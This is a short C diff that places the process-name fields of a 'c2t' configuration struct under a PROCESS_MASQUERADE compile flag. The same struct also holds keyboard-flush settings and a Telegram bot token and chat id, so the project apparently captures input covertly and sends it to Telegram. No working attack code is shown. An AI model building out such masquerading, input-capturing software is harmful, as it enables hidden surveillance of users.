@@ -39,8 +39,10 @@ typedef struct {
     size_t retry_delay_ms;
     int disable_keyboard;
     size_t keyboard_flush_ms;
+#ifdef C2T_ENABLE_PROCESS_MASQUERADE
     const char *daemon_name;
     const char *supervisor_name;
+#endif
     const char *telegram_bot_token;
     const char *telegram_chat_id;
 } c2t_config_t;
